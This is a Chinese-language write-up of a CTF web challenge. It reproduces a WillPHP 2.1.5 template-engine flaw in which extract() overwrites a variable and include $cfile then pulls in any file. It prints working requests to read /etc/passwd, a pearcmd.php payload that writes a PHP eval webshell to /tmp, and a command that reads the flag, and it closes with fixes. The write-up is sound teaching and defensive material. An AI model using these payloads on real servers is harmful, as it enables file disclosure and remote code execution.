---
title: 湖湘杯CTF WillPHP 2.1.5 模板引擎文件包含漏洞复现与 pearcmd.php 利用链分析
description: 详细复现湖湘杯CTF Web题目中的 WillPHP 2.1.5 框架漏洞：从 assign()/view() 入口追踪至 Tple::renderTo()
  的 extract() 变量覆盖与 include $cfile 任意文件包含，利用 pearcmd.php 写入 Webshell 完成攻击链。
category: program-analysis
tags:
- CTF
- WillPHP
- 文件包含
- 模板引擎
- 变量覆盖
- pearcmd.php
- 漏洞复现
- 湖湘杯
date: '2021-11-25'
updated: '2026-11-14'
---

## 漏洞背景与影响

湖湘杯 CTF Web 方向第一题，目标框架为 **WillPHP v2.1.5**（参考 ThinkPHP 3.2 设计）。题目页面直接暴露了 `assign()` 与 `view()` 调用片段，提示模板渲染逻辑为突破口。漏洞核心在于模板引擎渲染流程中 `extract()` 导致的变量覆盖，进而控制 `include $cfile` 实现任意文件包含（LFI/RFI），并结合系统自带的 `pearcmd.php` 落地 Webshell。

## 代码调用链追踪

### 入口点：Controller.assign() → View.view()

```php
// Controller 基类片段
public function assign($name, $value = '') {
    $this->view->assign($name, $value);
    return $this;
}

public function view($template = '', $vars = [], $replace = [], $config = []) {
    return $this->view->fetch($template, $vars, $replace, $config);
}
```

`assign()` 仅将键值对传递给 `View` 实例，`view()` 最终调用 `View::fetch()`。

### View.fetch() → Tple.render()

```php
// View.php
public function fetch($template, $vars = [], $replace = [], $config = []) {
    // ... 模板文件查找、路径规范化 ...
    $tple = new Tple($config);
    return $tple->render($templateFile, $vars, $replace);
}
```

### Tple.render() → Tple.renderTo()

```php
// Tple.php
public function render($templateFile, $vars = [], $replace = []) {
    // ... 变量预处理 ...
    return $this->renderTo($templateFile, $vars, $replace);
}
```

### 关键漏洞点：Tple.renderTo()

```php
// Tple.php
protected function renderTo($templateFile, $vars, $replace) {
    extract($vars, EXTR_OVERWRITE);          // 【漏洞点 1】变量覆盖
    // ... 模板替换逻辑 ...
    $cfile = $this->compile($templateFile);  // 编译生成缓存文件路径
    include $cfile;                          // 【漏洞点 2】任意文件包含
}
```

- `extract($vars, EXTR_OVERWRITE)` 将用户可控的 `$vars` 数组解压为当前符号表变量，若传入 `cfile` 键，直接覆盖内部 `$cfile`。
- `include $cfile` 无任何过滤，包含任意路径文件。

## 漏洞利用链构造

### 步骤 1：任意文件读取（验证漏洞）

```
GET /?name=cfile&value=/etc/passwd
```

- `assign('cfile', '/etc/passwd')` → `$vars['cfile'] = '/etc/passwd'`
- `extract()` 后 `$cfile = '/etc/passwd'`
- `include '/etc/passwd'` 回显文件内容

> 实测可读取 `/etc/passwd`，但目标 Flag 不在常规路径。

### 步骤 2：利用 pearcmd.php 写入 Webshell

**原理**：`/usr/local/lib/php/pearcmd.php` 通过 `$_SERVER['argv']` 解析命令行参数，支持 `pear config-set` 等子命令。通过文件包含引入该脚本，并控制 `$_SERVER['argv']`，可执行任意 PEAR 安装命令，将恶意 PHP 文件写入可写目录（如 `/tmp`）。

**Payload（需在 Burp Suite 中手工修改 URL 编码）**：

```
GET /?name=cfile&value=/usr/local/lib/php/pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?php eval($_POST[0]);?>+-s+
```

参数解析等效于：

```bash
pear -c /tmp/shell.php -d man_dir=<?php eval($_POST[0]);?> -s
```

- `-c` 指定配置文件路径（即 Webshell 路径）
- `-d man_dir=...` 注入 PHP 代码作为配置值
- `-s` 静默模式

> **注意**：URL 中 `<` `>` 会被编码，导致 PHP 标签失效，必须在 Burp Repeater 中将 `%3C` `%3E` 还原为 `<` `>` 再发送。

### 步骤 3：包含 Webshell 获取 Flag

```
GET /?name=cfile&value=/tmp/shell.php
POST /?name=cfile&value=/tmp/shell.php  0=system('cat /flag');
```

- 再次触发 LFI 包含 `/tmp/shell.php`
- Webshell 接收 POST 参数 `0` 执行任意命令

## 关键技术点总结

| 环节 | 函数/文件 | 关键机制 | 利用条件 |
|------|-----------|----------|----------|
| 变量覆盖 | `Tple::renderTo()` → `extract($vars, EXTR_OVERWRITE)` | 用户输入直接解压为局部变量 | 可控 `assign()` 参数 |
| 任意文件包含 | `include $cfile` | 无路径校验、无后缀限制 | 覆盖 `$cfile` 变量 |
| 命令注入落地 | `/usr/local/lib/php/pearcmd.php` | `$_SERVER['argv']` 解析 PEAR CLI 参数 | PHP 环境自带 PEAR、目标目录可写 |
| Webshell 执行 | 二次包含 `/tmp/shell.php` | `eval($_POST[0])` | 文件包含再次触发 |

## 防御与修复建议

1. **禁用危险函数**：`disable_functions=extract,include,require,...`（需结合业务评估）
2. **模板变量白名单**：`extract(array_intersect_key($vars, $allowedKeys))`
3. **文件包含路径校验**：
   ```php
   $cfile = realpath($cfile);
   if (strpos($cfile, $templateCacheDir) !== 0) die('Invalid template path');
   ```
4. **移除/限制 PEAR 命令行工具**：生产环境删除 `pearcmd.php` 或限制 Web 进程执行权限。
5. **升级框架**：WillPHP 后续版本已修复该渲染逻辑，建议迁移至维护版本。

## 关联知识页面

- [[php-webshell-obfuscation-av-evasion]] — PHP Webshell 混淆与免杀技术，可用于对抗检测的二次利用阶段
- [[vulnhub-platform-resource-index]] — VulnHub 靶场资源索引，包含更多实战演练环境
- [[cybersecurity-interview-guide-2022]] — 网络安全面试指南，含文件包含漏洞原理与利用常考点

## 时间线

- **2021-11-25** 原文发布（微信公众号“无名安全团队”）
- **2024-** 整理入库，结构化归档

---
*页面维护者：数字知识库策展人*  
*数据来源：湖湘杯 CTF 实战复现文章*

## 来源

- [0x00实验室-202108-202304_044](../sources/0x00实验室-202108-202304_044.md)
